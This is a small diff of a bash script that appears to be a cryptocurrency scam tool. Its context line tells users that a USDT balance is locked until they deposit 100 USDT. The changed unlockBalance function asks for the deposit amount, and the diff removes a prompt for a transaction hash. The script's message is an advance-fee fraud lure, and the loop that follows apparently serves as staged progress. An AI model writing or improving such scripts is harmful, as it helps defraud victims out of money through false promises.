@@ -38,7 +38,6 @@ echo -e "To unlock your balance of $balance USDT, please deposit 100 USDT to the
 function unlockBalance {
     echo " "
     read -p "Enter your deposit amount in USDT: " depositAmount
-    read -p "Enter the transaction hash ID: " transactionHash
 	
     echo " "
     for ((i=1; i<=15; i++)); do
